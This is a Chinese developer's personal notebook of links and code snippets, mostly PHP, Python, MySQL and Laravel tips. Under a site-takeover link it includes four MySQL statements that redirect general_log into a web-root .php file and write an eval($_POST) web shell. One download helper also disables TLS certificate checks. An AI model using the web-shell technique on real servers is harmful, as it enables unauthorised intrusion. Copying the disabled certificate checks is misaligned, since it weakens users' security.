[简历黑客](http://jianliheike.com)
[Scrapy第五篇：断点续爬 | 存入MySQL](https://zhuanlan.zhihu.com/p/26810901?group_id=845755819374047232)
CTF学习站点总结https://zhuanlan.zhihu.com/p/26876253?group_id=846472044680990720  【以图搜图】网站大全了https://zhuanlan.zhihu.com/p/25610099
图片内容鉴别主要包括：鉴黄、暴恐识别、OCR（识别图片中的文字）https://zhuanlan.zhihu.com/p/26819950?group_id=845705440347176960 https://www.tuputech.com/demo  
Ngrok：本地主机的安全隧道工具https://ngrok.com/
用非常生动的动画给你讲数学，每集10分钟左右。http://t.cn/RIJNj6h 
app后端设计--总目录 http://blog.csdn.net/newjueqi/article/details/19003775 
你遇到过哪些神奇的网站，并且改变了你的生活质量http://weibo.com/2182038504/F1QTtbrkv 
 leetcode-cli: 体验不一样的刷题风 (2) 流程篇https://github.com/skygragon/leetcode-cli
唐宋文学编年地图http://sou-yun.com/poetlife.html
安利一个良心电影、电视剧下载网站https://moviejie.com/
ss翻墙http://macvpn.hk/
收集整理一些常用的PHP类库https://github.com/JingwenTian/awesome-php 
php 源码阅读http://ghost.icosplay.cc/2017/04/25/php-yuan-ma-yue-du
浅谈PHP进程管理http://www.manks.top/php-cgi-fpm.html
一行代码，打造在线编辑器http://blog.githuber.cn/posts/2395 http://litaotao.github.io/files/editor.html
8种常被忽视的SQL错误用法http://mp.weixin.qq.com/s/1WpspGr7R-EjXfhWzlsZvQ
支付开发填坑记之微信支付https://segmentfault.com/a/1190000009346755
public function xmlToArray($xml){
    return json_decode(json_encode(simplexml_load_string($xml, 'SimpleXMLElement', LIBXML_NOCDATA)), true);
}


easyPHP-Swoole：专为 API 而生的常驻内存化的 PHP 开发框架https://github.com/kiss291323003/easyPHP-Swoole  
SQLizer现在有将文件转换为SQL的API。  https://sqlizer.io/help/api#step1
这个在线二维码生成器不错 
推荐几个常用的PDF在线转换网站】Smallpdf：O网页链接，ilovepdf：O网页链接，ConvertPDFtoWord：PDFConverter：O网页链接，PDFmyURL
ypefont：用于识别照片中文本字体的算法。  https://github.com/Sirvasile/Typefont
数据结构常见的八大排序算法（详细整理）http://www.jianshu.com/p/7d037c332a9d
HTTP Prompt is an interactive command-line HTTPhttp://http-prompt.com/
Laravel的Facade实现原理http://www.jianshu.com/p/fd03d0ebc22a?hmsr=toutiao.io&utm_medium=toutiao.io&utm_source=toutiao.io
Facade其实是一个容器中类的静态代理，他可以让你以静态的方式来调用存放在容器中任何对象的任何方法。 直接来看看__callStatic这个方法
Hacking Tools搜罗大集合http://www.freebuf.com/sectool/133949.html
开源的类 PostMan，API 管理工具https://github.com/getinsomnia/insomnia
基于Python开发的可以模拟百万用户的压测工具https://github.com/locustio/locust?files=1
命令行下，我总是使用 jq 解析 JSON 数据网页版 https://github.com/fiatjaf/jq-web
APP应用和网页版的支付功能（支付宝，微信，银联）http://blog.leungjz.top/2017/05/10/payment-alipay/?hmsr=toutiao.io&utm_medium=toutiao.io&utm_source=toutiao.io
https://sqlnotebook.com/ 
php代码检测https://github.com/phpro/grumphp composer require --dev phpro/grumphp
[除了我们常用的硕鼠外，再给大家安利一款超厉害的视频下载工具视频下载王），它不仅支持YouTube、Vimeo、Fox、AcFun、哔哩哔哩、优酷、爱奇艺](https://www.apowersoft.cn/video-download-capture)
[常见的网站服务器架构有哪些](https://www.zhihu.com/question/20657269/answer/101795180)
反反爬虫利器！教你怎么用代理，拨号换IP……https://zhuanlan.zhihu.com/p/26876834
爬虫比较https://github.com/lining0806/PythonSpiderNotes
抓取手机app的数据（摩拜单车https://zhuanlan.zhihu.com/p/26785815 http://link.zhihu.com/?target=https%3A//github.com/kimg1234/pachong/blob/master/mobai.py
php数组排序https://www.zhihu.com/question/59614878/answer/167121815
```js
uasort($arr, function($a, $b) {
	// 比较函数返回1表示交换顺序
	if($a['Order_info']['add_time'] == $b['Order_info']['add_time']) {
		return 0;
	} else {	
		// 大的交换到前面,所以是降序
		return ($a['Order_info']['add_time'] < $b['Order_info']['add_time']) ? 1 : -1;
		// 小的交换到前面,所以是升序
		return ($a['Order_info']['add_time'] > $b['Order_info']['add_time']) ? 1 : -1;
	}
});

作者：eechen
链接：https://www.zhihu.com/question/59614878/answer/167121815
来源：知乎
著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。
```
[低端姿势拿下某IDC公司主站php](https://zhuanlan.zhihu.com/p/26658739?group_id=842400839929847808)
借助的就是MySQL的general_log，MySQL中这个general_log是用于记录MySQL中所有执行过的SQL查询，他的记录方式可以是数据表，也可以是文件，并且文件路径也可以指定https://github.com/cw1997/MySQL-Monitor MySQL服务器执行SQL记录实时监控（WEB版本）
show global variables like '%general%';
set global general_log = on;
set global general_log_file = 'D://phpStudy//WWW//ThinkPHP//test.php';
select '<?php @ev（防和谐补丁）al($_POST[admin])?>';
[有哪些实用的计算机相关技能，可以在一天内学会？](https://zhuanlan.zhihu.com/p/26661971?group_id=842461525452136448)
[把嵌套的python list转成一个一维的python list](https://www.zhihu.com/question/27010691)
```js
>>> from compiler.ast import flatten
>>> flatten(a)
reduce(lambda x,y:x+y, a)
import itertools
a = [[1,2,3],[4,5,6], [7], [8,9]]
out = list(itertools.chain.from_iterable(a))
sum(a,[])
def fun(li,em=[]):  #优雅滴写法，包治各种嵌套
    for x in li:
        if type(x)!=list:
            em.append(x)
        else:
            fun(x)
    return em

最简单的方法，用 numpy.ravel()。

a = [[1,2,3], [5, 2, 8], [7,8,9]]

list(np.ravel(a))

得到： 

[1, 2, 3, 5, 2, 8, 7, 8, 9]
a= eval('['+str(a).replace(' ','').replace('[','').replace(']','')+']')
import operator
from functools import reduce
a = [[1,2,3], [4,5,6], [7,8,9]]
print(reduce(operator.add, a))
[item for sublist in list for item in sublist]
a = eval('[%s]'%repr(l).replace('[', '').replace(']', ''))
```
[分享几个快乐有趣的网站](https://zhuanlan.zhihu.com/p/26871835?group_id=846461293912276992)
在线制作GIF动态图片http://link.zhihu.com/?target=http%3A//gickr.com/
[别被忽悠，你要逃离不肯给你涨薪的公司](https://zhuanlan.zhihu.com/p/26855046?group_id=846121250454634497)
你应该去回答：「我看重的，绝不是薪水这么简单，是工作、岗位所能给我带来的价值有多少，以及我在这份工作能提供的价值是多少。薪水是象征了一个人的职业素养和职场价值，所以我们谈论的不仅仅是薪水这么简单，而是在谈论我的专业实力以及我的职业操守，因此，我认为我是有提供价值的，想提升相应薪水。所以，请问：公司能为我现在的岗位提供的薪水是多少？」
[大数据系列 2 —看腾讯的大数据产品](https://zhuanlan.zhihu.com/p/25634208)
腾讯位置大数据http://link.zhihu.com/?target=https%3A//heat.qq.com/index.php  http://link.zhihu.com/?target=https%3A//www.qcloud.com/act/event/ci_demo.html 微信指数 、万象优图
[将文字隐藏到图片中](https://zhuanlan.zhihu.com/p/25285364?refer=wnsouba)
http://link.zhihu.com/?target=http%3A//www.shuidi.im/
飞搜人脸识别 http://link.zhihu.com/?target=http%3A//www.faceall.cn%3A82/
阿里绿网http://link.zhihu.com/?target=https%3A//m.aliyun.com/markets/aliyun/act/lvwangdemo%3Fspm%3D5176.55804.359640.1.6xojDa%23testOnline
网易易盾http://link.zhihu.com/?target=http%3A//dun.163.com/trial/image
图普科技http://link.zhihu.com/?target=https%3A//www.tuputech.com/demo
腾讯优图http://link.zhihu.com/?target=https%3A//open.youtu.qq.com/welcome/experience
[是腾讯出的TIM，TIM是一款轻量级的QQ实时多人编辑文档国内的有一起写、石墨文档](https://zhuanlan.zhihu.com/p/26255850)
[知乎TOP 500 赞的回答](https://zhuanlan.zhihu.com/p/26779637)
[百度云盘搜索](http://www.biliworld.com/)
[面试官问现在工资是多少？该怎么回答？](https://zhuanlan.zhihu.com/p/26830966?group_id=845718905661038592)
[Python进阶](https://github.com/eastlakeside/interpy-zh)
[php生成随机红包算法](http://www.jianshu.com/p/287a21a24e09#)
[简单理解RESTful API接口风格](http://www.lcode.cc/2016/08/10/restful-v1.html)
[CGI与fastcgi与php-fpm与php-cgi的关系](http://www.lcode.cc/2017/01/15/php-fpm.html)
cgi是一个协议，它规定了服务器Nginx会将那些数据传送给php-cgi

fastcgi也可以说是一个协议。fastcgi是对cgi的性能的一次提高。fastcgi会先启动一个master，解析配置文件（php.ini等），初始化执行环境，然后再启动多个worker，当请求过来时，master会传递给一个worker，然后等待下一个请求。

php-fpm是实现了fastcgi这个协议的程序，用来管理php-cgi的（php-fpm是fastcgi进程管理器）

php-cgi是解释php程序的

[PHP文件锁机制](http://www.lcode.cc/2016/10/15/php-flock.html)
```js
//获取指针
$file = 'lock/increase.txt';
$fp = fopen($file, 'r');
//加排他锁
flock($fp, LOCK_EX);
//数据操作
$key = 'company_watch_num_' . $request['company_id'];
Cache::increment($key);
//解锁
flock($fp, LOCK_UN);
//关闭指针
fclose($fp);
```
[PyPDF2 用 Python 操作 PDF](https://zhuanlan.zhihu.com/p/26647491?group_id=842900717793603584)
```js
from PyPDF2 import PdfFileReader, PdfFileWriter
infn = 'infn.pdf'
outfn = 'outfn.pdf'
# 获取一个 PdfFileReader 对象
pdf_input = PdfFileReader(open(infn, 'rb'))
# 获取 PDF 的页数
page_count = pdf_input.getNumPages()
print(page_count)
# 返回一个 PageObject
page = pdf_input.getPage(i)

# 获取一个 PdfFileWriter 对象
pdf_output = PdfFileWriter()
# 将一个 PageObject 加入到 PdfFileWriter 中
pdf_output.addPage(page)
# 输出到文件中
pdf_output.write(open(outfn, 'wb'))
```


[命令行提示](https://github.com/chrisallenlane/cheat)
cheat python 
[Python编码之殇](https://zhuanlan.zhihu.com/p/26379043?group_id=843751406606364672)
```js
a="\\u8fdd\\u6cd5\\u8fdd\u89c4" #变量a的内容为unicode编码，变量a为string编码（""前不要加u）
b=a.decode('unicode-escape')
a="\\xe5\\x85\\xb3\\xe4\\xba\\x8e\\xe4" #变量a的内容为string编码，变量a为string编码（""前不要加u）
b=a.decode('string-escape')
a="\\xe5\\x85\\xb3\\xe4\\xba\\x8e\\xe4" #变量a的内容为string编码，变量a为string编码（""前不要加u）
b=a.decode('string-escape')
print b
# 如果你的dict1现在是个字典，要用json库转成字符串再处理
dict1 = {"data":["\u73bb\u7483", "\u5851\u6599", "\u91d1\u5c5e"]}
import json
j = json.dumps(dict1)
dict2  = j.decode("unicode-escape").decode("unicode-escape")
print dict2`
[抓取单博主的所有微博及其评论](https://zhuanlan.zhihu.com/p/26793251?group_id=845221469830144000)
http://m.weibo.cn/api/comments/show?id=4103033291539613&page=4
[开启知乎收藏夹看图模式](https://zhuanlan.zhihu.com/p/26751624?group_id=844818990198030336)
https://github.com/wzyonggege/Zhihu-Crawler 
[！Github上的PHP资源汇总大全](https://zhuanlan.zhihu.com/p/26685858?group_id=844527860935983104)
[【QQ/微信个人号变身机器人】炸群+远程监控个人PC的尝试在公众号（rose-fun）](https://zhuanlan.zhihu.com/p/26820394?group_id=845639113100107776)
[根据用户id生成一个唯一邀请码](http://www.lcode.cc/2017/04/10/user-invite-code.html)
[当Python遇上微信，可以这么玩](https://zhuanlan.zhihu.com/p/26514576?group_id=843751714145312768)
http://link.zhihu.com/?target=https%3A//github.com/wzyonggege/python-wechat-itchat 


```js
function decode($code) {
    static $source_string = 'E5FCDG3HQA4B1NOPIJ2RSTUV67MWX89KLYZ';
    if (strrpos($code, '0') !== false)
        $code = substr($code, strrpos($code, '0')+1);
    $len = strlen($code);
    $code = strrev($code);
    $num = 0;
    for ($i=0; $i < $len; $i++) {
        $num += strpos($source_string, $code[$i]) * pow(35, $i);
    }
    return $num;
}
 function createCode($user_id) {
    static $source_string = 'E5FCDG3HQA4B1NOPIJ2RSTUV67MWX89KLYZ';
    $num = $user_id;
    $code = '';
    while ( $num > 0) {
        $mod = $num % 35;
        $num = ($num - $mod) / 35;
        $code = $source_string[$mod].$code;
    }
    if(empty($code[3]))
        $code = str_pad($code,4,'0',STR_PAD_LEFT);
    return $code;
}
```
```js
#查找目录下的所有文件中是否含有某个字符串
find .|xargs grep -ri "IBM" 

#查找目录下的所有文件中是否含有某个字符串,并且只打印出文件名
find .|xargs grep -ri "IBM" -l 

#xargs配合grep查找
find -type f -name '*.php'|xargs grep 'GroupRecord'

#查看占用端口的程序或按进程号查询程序
netstat -anp|grep 80

#查看进程id
ps -ef | grep Name
REST ful 是面向资源的，而资源是通过 URI 进行暴露。
GET /rest/api/getDogs | GET /rest/api/dogs 获取所有狗 
POST /rest/api/addDogs | POST /rest/api/dogs 添加一个狗    
PUT /rest/api/editDogs/:dog_id | PUT /rest/api/dogs/:dog_id 修改一只狗 
DELETE /rest/api/deleteDogs/:dog_id | DELETE /rest/api/dogs/:dog_id 删除一只狗
GET      获取一个资源 
POST     添加一个资源 
PUT      修改一个资源 
DELETE   删除一个资源
这四个动词实际上就对应着增删改查四个操作，这就利用了HTTP 动词来表示对资源的操作。

```
[php中GET/POST方法+号等特殊字符处理](https://iyaozhen.com/post-get-urlcode.html)
```js
$base64_image = str_replace(' ', '+', $base64);
    //post的数据里面，加号会被替换为空格，需要重新替换回来，如果不是post的数据，则注释掉这一行
    //PHP解析GET参数时，会经过过滤，即urldecode()处理，而urldecode会解码给出的已编码字符串中的任何 %##。 加号（'+'）被解码成一个空格字符。
    //解决方法：传递参数时，对GET参数进行url编码，注意最好不使用urlencode()，否则会编码空格为+。应参考RFC 1738对url进行编码，使用rawurlencode()，将加号编码为 。这样上面例子中param=abc百分20百分2B，php接收到的param才会是abc +
    //另外POST方式会 使用application/x-www-form-urlencoded此编码编码body中的数据，所以不会出现上述例子中的问题。
    //字符串base64后传输之前可以先把“+”号替换掉，用“_”,“|”等等都可以，然后另一个页面接收的时候再替换过来即可（str_replace）。最后把替换之后的base64再解码。ok
    //https://iyaozhen.com/post-get-urlcode.html
    //重定向后的地址中加密后的name参数，其中包含“+”符号，而浏览器的地址栏中碰到“+”符号时会将加号转换为空格，于是要保证base64_decode进行正确的解码操作，我们可以先将参数中的空格替换成加号
    参照GET方法中的解决方案，urlencode一下参数值就行了
    $a = urlencode($a);	// url编码，处理特殊字符 服务端也不用urldecode
	$post_data = "a=$a&b=123";	//POST值 
get会忽略url的#后的字符	


laravel 框架这边的写法目前有2个地方需要注意一下：
1、采用静态方法调用update和同时update多条数据时，触发不了模型里的钩子。users::where('id',123)->update([]);
2、由于主从同步的原因，数据写入库立即查询的更新数据到缓存的话需要强制查询主库，否则查从库有概率缓存的数据是旧的。

把异步的任务，可以变成同步的方式来执行。
进程是关于程序与程序之间的内存隔离方式线程是并发处理 
php-fpm 给每个网站分配一个水池子  一个水池子就是一个进程
一个水池子是干掉还是洪水泛滥都不影响另一个 可是一个水池，只能一个人游泳... 这就是单线程
 
进程在内存上是相互隔离的，大多数的时候进程进程之间互不影响的，所以开多进程就是为了进程之间的独立性
线程基本都是运行在统一进程之下的， 多线程是为了并发处理的

拿我以前做的一件事给你举例，  10年前视频转换很麻烦，我们方式都是在windows下处理的 用的一个叫conver vedio的团建

我们的做法是写一个控制台程序  控制台程序从数据库中读取要转换的视频，然后开多线程 一个线程启动一个convert vedio软件进程，并守护这个进程
多个convert vedio进程就是多进程   控制台程序本身也是个进程。 内存上都是相互隔离的，一个进程崩溃是不会影响另一进程的

控制台中读取数据后 用多线程并发处理数据
nodejs是操蛋的单进程（除了子进程外） 单线程的玩意

要是你一台服务器上有多个nodejs网站， 而你又没使用pm2一类的东西， 那你完蛋了， 一个网站奔溃， 其它网站跟着全奔，因为运行在一个进程里哒，有PM2就不一样了 因为他可以隔离和守护nodejs进程

nodejs虽然单线程  但是他的IO部分是拿多线程写的，所以才能实现异步
跟PHP没关系   是php-fpm是多进程的而已 你还是没搞明白进程的概念
一个软件的整体可以看做一个进程

你可以开两个phpstorm 甚至多个    ，一个 phpstorm访问不了另一个phpstorm里的东西   一个phpstorm崩溃了不影响另一个
```
[PHPer也来聊聊HTTP](http://martist.cn/a/74)

[搭建博客必备：图片拖动文本框自动上传](http://www.tenyearsme.cn/blog/da-jian-bo-ke-bi-bei-wen-ben-kuang-tuo-dong-shang-chuan-tu-pian)
https://github.com/Rovak/InlineAttachment
[Laravel 实用的辅助函数小技巧--helper](https://www.blog8090.com/laravel-helper/)
```js
$array = array_collapse([[1, 2, 3], [4, 5, 6], [7, 8, 9]]);

// [1, 2, 3, 4, 5, 6, 7, 8, 9]
$value = str_limit('The PHP framework for web artisans.', 7);

// The PHP...
collect($obj)->toArray();  
$arr = collect([1,2,3,4])->filter(function ($str){
                return $str > 2;
        });
        dd($arr);
	$collection = collect(['Tom', 'Lark']);
$zipped = $collection->zip(['170cm', '181cm']);
$zipped->all();
// [['Tom', '170cm'], ['Lark', '181cm']]
```

[Mysql 批量更新多行笔记](https://www.h57.pw/aritlce/25)
```js
update test set test.group = case name
    when '小白' then 9
    when '小红' then 10
    end
where name in ('小白')
update test set test.group = case name
    when '小白' then 9
    when '小红' then 10
    else 11
    end
where name in ('小白','大白')
大白 没有被任何 when 所捕获到，所以，执行了 else 部分，把值更改为了11。
update test set test.sex = case name
    when '小白' then 2
    when '小红' then 2
    else 11
    end
where name in ('小白','小红') and test.group = 1
```



[FRP内网穿透工具](https://www.diannaobos.com/frp/)

概率分配
```js
$w = array('a' =>1, 'b'=>10, 'c'=>14, 'e'=>20, 'f'=>30, 'h'=>6, 'g'=>70);
function roll($weight)
{
    $sum = array_sum($weight);
    $j = 0;
    foreach($weight as $k=>$v)
    {
        $j = mt_rand(1,$sum);
        if($j <= $v)
        {
            return $k;
        }else{
            $sum -= $v;
        }
    }
}
$ret = array();
$n = 1000;
for($i=0;$i<$n;$i++)
{
    $v = roll($w);
    $ret[$v] = isset($ret[$v]) ? $ret[$v] + 1 :1;
}
echo '<pre>';
print_r($ret);
echo array_sum($ret);
foreach($ret as $k=>$v)
{
     printf("real: %f\t", ($v / $n));
     printf("set: %f\n",($w[$k] / array_sum($w)));
}
Array
(
    [g] => 462
    [c] => 80
    [h] => 44
    [e] => 148
    [f] => 199
    [b] => 61
    [a] => 6
)
1000real: 0.462000	set: 0.463576
real: 0.080000	set: 0.092715
real: 0.044000	set: 0.039735
real: 0.148000	set: 0.132450
real: 0.199000	set: 0.198675
real: 0.061000	set: 0.066225
real: 0.006000	set: 0.006623

function  shutdown ()
{
     // This is our shutdown function, in 
    // here we can do any last operations
    // before the script is complete.
print_r(error_get_last());
     echo  'Script executed with success' ,  PHP_EOL ;
}

 register_shutdown_function ( 'shutdown' );
 setcookie ( "cookies[one]" ,  "cookieone" );
 print_r($_COOKIE);
 Array
(
    [Hm_lvt_8cc45d54c337ca616c34b1cf747da91c] => 1494467863
    [Hm_lpvt_8cc45d54c337ca616c34b1cf747da91c] => 1494469325
    [cookies] => Array
        (
            [one] => cookieone
        )

)

$files=glob('./*.php');
$files = array_map('realpath', $files);
print_r($files);
$a='11111111111111111111111111111111111111';
$b='2222222222222222222222222222222222222';
echo bcadd($a,$b);//13333333333333333333333333333333333333
echo bccomp($a, $b); //1
echo bccomp($b, $a); //-1
echo bccomp($a, $a); //0
preg_match_all('/./us', '分隔字符串', $matches);
print_r($matches);
Array
(
    [0] => Array
        (
            [0] => 分
            [1] => 隔
            [2] => 字
            [3] => 符
            [4] => 串
        )

)
$id='1,5';
$arr= array(1=>'php',3=>'js',5=>'python');
$res =array_intersect_key($arr, array_flip(explode(',', $id)));
print_r($res);
Array
(
    [1] => php
    [5] => python
)
print vsprintf("%04d-%02d-%02d", explode('-', '1988-8-1')); // 1988-08-01
date_default_timezone_set('PRC');
```
重复的ID
```js
 String.prototype.strrev = function(){
return this.split('').reverse().join('');
}
var tmpId = [];
var result = [];
$('*[id]').each(function() {
    if ($.inArray($(this).attr('id'), tmpId) == -1) {
        tmpId.push($(this).attr('id'));
    } else {
        result.push($(this).attr('id')); 
    }
}) 
if (result.length > 0) {
    console.log('重复的ID为:' + result.join(' || '));
} else {
    console.log('没有重复的ID');
}
```


 一个5位数字ABCDE*4=EDCBA,这5个数字不重复，请编程求出来这个数字是多少？
```
for($i=12345; $i<25000; $i++){
if( $i*4==strrev($i) && count(array_unique(str_split($i)))==strlen($i) )
echo $i;
}


for($i=10000;$i<25000;$i++){
if(count(array_unique(str_split($i)))==count(str_split($i)) && $i*4==strrev($i)){
echo $i;
}
}

$num = range(12345,24999);
foreach ($num as $val){

$sum = strrev($val);
if($val*4 == $sum){
echo $val;
break;
}
}

$nums=ceil(98765/4);
for($i = 12345;$i<$nums;$i++){
    if($i*4 == strrev($i)){
       echo $i.'<br />';
     }
}
```
时间相差月份
```js
getPeopleMonth('2017-12-12');//6
function getPeopleMonth($time)
    {
        $validTime = date('Y-m-d', strtotime('+1 day'));
        if ($validTime>$time) {
            return 0;
        }
        $carbonDate = new Carbon($validTime);
        $diffDate = $carbonDate->diff(new Carbon($time), true);
        $month = $diffDate->y * 12 + $diffDate->m;
        if ($month>0 && $diffDate->d == 0) {
            $month = $month-1;
        }
        return $month;
    }

```

[PHP百科全书](http://php.swoole.com/wiki/%E9%A6%96%E9%A1%B5)
[投资意向生成书](http://wltermsheet.applinzi.com/)
微信红包
```js
$sum = 10;  //总价钱
 
        $num = 8 ;  //人数
 
        $min = 0.01;    //最少值
 
        for($i=1;$i<$num;$i++){
 
            $row = ($sum-($num-$i)*$min)/($num-$i);// 安全值
 
            $money = mt_rand($min*100,$row*100)/100;
 
            $sum -= $money;
 
            echo '第'.$i.'人，领取'.$money.'元，剩下'.$sum.'元<br/>';
 
        }
 
        echo '第'.$num.'人，领取'.$sum.'元，剩下'.$sum.'元';
        第1人，领取1.15元，剩下8.85元
第2人，领取1.16元，剩下7.69元
第3人，领取1.45元，剩下6.24元
第4人，领取1.25元，剩下4.99元
第5人，领取0.3元，剩下4.69元
第6人，领取0.51元，剩下4.18元
第7人，领取0.89元，剩下3.29元
第8人，领取3.29元，剩下3.29元

print_r(getRand([4,7,2,8,1]));
 function getRand($proArr) { //传入的为一维数字数组,此数组中数字即为相应概率 中奖概率问题应
        $result = '';
        //概率数组的总概率精度
        $proSum = array_sum($proArr);
        //概率数组循环
        foreach ($proArr as $key => $proCur) {
            $randNum = mt_rand(1, $proSum);
            if ($randNum <= $proCur) {
                $result = $key;
                break;
            } else {
                $proSum -= $proCur;
            }
        }
        unset ($proArr);
        return $result;
    }
```
过滤用户昵称里面的emoji特殊字符
```js
/** +----------------------------------------------------------
 * 过滤用户昵称里面的emoji特殊字符 +----------------------------------------------------------
 * @param string    $str   待输出的用户昵称 +----------------------------------------------------------
 */
 function jsonName($str) {
    if($str){
        $tmpStr = json_encode($str);
        $tmpStr2 = preg_replace("#(\\\ud[0-9a-f]{3})#ie","",$tmpStr);
        $return = json_decode($tmpStr2);
        if(!$return){
            return jsonName($return);
        }
    }else{
        $return = '微信用户-'.time();
    }    
    return $return;
 }
 function hideStar($str) { //用户名、邮箱、手机账号中间字符串以*隐藏 
    if (strpos($str, '@')) { 
        $email_array = explode("@", $str); 
        $prevfix = (strlen($email_array[0]) < 4) ? "" : substr($str, 0, 3); //邮箱前缀 
        $count = 0; 
        $str = preg_replace('/([\d\w+_-]{0,100})@/', '***@', $str, -1, $count); 
        $rs = $prevfix . $str; 
    } else { 
        $pattern = '/(1[3458]{1}[0-9])[0-9]{4}([0-9]{4})/i'; 
        if (preg_match($pattern, $str)) { 
            $rs = preg_replace($pattern, '$1****$2', $str); // substr_replace($name,'****',3,4); 
        } else { 
            $rs = substr($str, 0, 3) . "***" . substr($str, -1); 
        } 
    } 
    return $rs; 
 }
```
保存远程文件
```js
function getImage($url,$save_dir='',$filename='',$type=0){
            if(trim($url)==''){
                return array('file_name'=>'','save_path'=>'','error'=>1);
            }
            if(trim($save_dir)==''){
                $save_dir='./';
            }
            if(trim($filename)==''){//保存文件名
                $ext=strrchr($url,'.');
            if($ext!='.gif'&&$ext!='.jpg'&&$ext!='.png'&&$ext!='.jpeg'){
                return array('file_name'=>'','save_path'=>'','error'=>3);
            }
                $filename=time().rand(0,10000).$ext;
            }
            if(0!==strrpos($save_dir,'/')){
                $save_dir.='/';
            }
            //创建保存目录
            if(!file_exists($save_dir)&&!mkdir($save_dir,0777,true)){
                return array('file_name'=>'','save_path'=>'','error'=>5);
            }
            //获取远程文件所采用的方法
            if($type){
                $ch=curl_init();
                $timeout=5;
                curl_setopt($ch,CURLOPT_URL,$url);
                curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
                curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,$timeout);
                //当请求https的数据时，会要求证书，加上下面这两个参数，规避ssl的证书检查
				curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE );
				curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
                $img=curl_exec($ch);
                curl_close($ch);
            }else{
                ob_start();
                readfile($url);
                $img=ob_get_contents();
                ob_end_clean();
            }
            //$size=strlen($img);
            //文件大小
            $fp2=@fopen($save_dir.$filename,'a');
            fwrite($fp2,$img);
            fclose($fp2);
            unset($img,$url);
            return array('file_name'=>$filename,'save_path'=>$save_dir.$filename,'error'=>0);
        }
        
$url = 'https://api.weixin.qq.com/cgi-bin/message/mass/preview?access_token=xxxxx';
parse_str(parse_url($url, PHP_URL_QUERY), $data);
[
    "access_token" => "xxxxx"
]

/**
 * 舍去法取整 版本的 number_format() 函数
 * @author leeyi <leeyisoft@qq.com>
 */
 function number_format_floor($number, $decimals=0, $dec_point='.', $thousands_sep=',') {
    $tmp = pow(10,$decimals);
    return number_format(floor($tmp*($number))/$tmp, $decimals, $dec_point, $thousands_sep);
 }
 function is_assoc_array($array)
{
    return array_keys($array) !== range(0, count($array) - 1);
}
```
单例
```js
final class Product
{

    /**
     * @var self
     */
    private static $instance;

    /**
     * @var mixed
     */
    public $mix;


    /**
     * Return self instance
     *
     * @return self
     */
    public static function getInstance() {
        if (!(self::$instance instanceof self)) {
            self::$instance = new self();
        }
        return self::$instance;
    }

    private function __construct() {
    }

    private function __clone() {
    }
}

$firstProduct = Product::getInstance();
$secondProduct = Product::getInstance();

$firstProduct->mix = 'test';
$secondProduct->mix = 'example';

print_r($firstProduct->mix);
// example
print_r($secondProduct->mix);
// example
```
数字格式化
```js
$str =2228282829299292;
 //失败
echo (string)$str;  //2.2282828292993E+15  失败
echo '<br>';
echo ' '.$str; //2.2282828292993E+15
echo '<br>';
echo strval($str); //2.2282828292993E+15
echo '<br>';
 //成功
echo sprintf("%.0f", $str);2228282829299292
echo '<br>';
echo number_format($str);// 三位逗号分隔
/**
     * 函数说明：验证身份证是否真实
     * 注：加权因子和校验码串为互联网统计  尾数自己测试11次 任意身份证都可以通过
     * 传递参数：
     * $number身份证号码
     * 返回参数：http://www.thinkphp.cn/code/1873.html
     * true验证通过
     * false验证失败
     */
    function isIdCard($number) {
        $sigma = '';
        //加权因子 
        $wi = array(7, 9, 10, 5, 8, 4, 2, 1, 6, 3, 7, 9, 10, 5, 8, 4, 2);
        //校验码串 
        $ai = array('1', '0', 'X', '9', '8', '7', '6', '5', '4', '3', '2');
        //按顺序循环处理前17位 
        for ($i = 0;$i < 17;$i++) { 
            //提取前17位的其中一位，并将变量类型转为实数 
            $b = (int) $number{$i}; 
            //提取相应的加权因子 
            $w = $wi[$i]; 
            //把从身份证号码中提取的一位数字和加权因子相乘，并累加 得到身份证前17位的乘机的和 
            $sigma += $b * $w;
        }
    //echo $sigma;die;
        //计算序号  用得到的乘机模11 取余数
        $snumber = $sigma % 11; 
        //按照序号从校验码串中提取相应的余数来验证最后一位。 
        $check_number = $ai[$snumber];
        if ($number{17} == $check_number) {
            return true;
        } else {
            return false;
        }
    }
    //eg
    if (!isIdCard('000000000000000001')) {
    echo "身份证号码不合法";
    } else {
    echo "身份证号码正确";
    }
```
php获取一个月的第一天和最后一天
```js
// php获取一个月的第一天和最后一天
 $date = date('Y-m-d H:i:s'); //当前时间
 function getthemonth($date)
 {
    $firstday = date('Y-m-01', strtotime($date));
    $lastday = date('Y-m-d', strtotime("$firstday +1 month -1 day"));
    return array($firstday, $lastday);
 }
$firstday= date('Y-m-d', mktime(0, 0, 0, date('m'), 1));
$lastday =date('Y-m-d', mktime(0, 0, 0,date('m')+1,1)-1);
echo cal_days_in_month(CAL_GREGORIAN,5,2016); //一个月天数,也就是最后一天 第一天 永远是1
echo date('Y-m-t');//最后一天
```
按概率抽奖
```js
function get_rand($arr){
 
            $arr_sum = array_sum($arr);
 
            $arr_rand = mt_rand(1,$arr_sum);
 
            foreach($arr as $key => $arr_num){
 
                $arr_sum -= $arr_num;
 
                if($arr_rand>$arr_sum){
 
                    return $key;
 
                }
 
            }
 
        }
 
        $p = array(
 
            '0' => array('id'=>1,'info'=>'一等奖','v'=>1),
 
            '1' => array('id'=>2,'info'=>'二等奖','v'=>5),
 
            '2' => array('id'=>3,'info'=>'三等奖','v'=>10),
 
            '3' => array('id'=>4,'info'=>'四等奖','v'=>34)
 
            );
 
        foreach($p as $key => $value){
 
            $arr[$value['id']] = $value['v'];
 
        }
 
        $rid = get_rand($arr);
 
        $res['yes'] = $p[$rid-1]['info'];
 
        unset ($p[$rid-1]) ;
 
        shuffle ($p);
 
        for($i=0;$i<count($p);$i++){
 
            $pr[]= $p[$i]['info'];
 
        }
 
        $res['no'] = $pr;
 echo '<pre>';
        print_r($res);
        Array
(
    [yes] => 一等奖
    [no] => Array
        (
            [0] => 三等奖
            [1] => 四等奖
            [2] => 二等奖
        )

)
```
导出doc文件
```js
function actionDlresume(){
        
        //数据查询http://www.thinkphp.cn/code/1654.html  将内容放到word文档city_name
            $re=['u_name'=>'php','g_sex'=>'na','school_type'=>1,'work_year'=>10,'g_school'=>'66','city_name'=>'ggg','work_email'=>'hhh','work_phone'=>'888','work_type'=>'555','edutation'=>'888','g_workj'=>'333','g_zuo'=>'000'];
            // print_r($re);die;
